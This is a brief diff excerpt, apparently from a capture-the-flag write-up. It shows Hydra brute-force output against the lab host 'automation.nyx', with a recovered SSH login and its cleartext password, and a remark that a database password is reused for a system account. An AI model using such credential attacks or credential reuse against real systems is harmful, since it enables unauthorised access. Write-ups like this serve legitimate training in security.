@@ -298,7 +298,6 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-27 17:43:
 [DATA] attacking ssh://automation.nyx:22/
 [22][ssh] host: automation.nyx   login: alex   password: 24!#saDf!f2ar8sA#
 1 of 1 target successfully completed, 1 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-27 17:43:32
 ```
 
 It works — the app's database password is reused as `alex`'s system password:
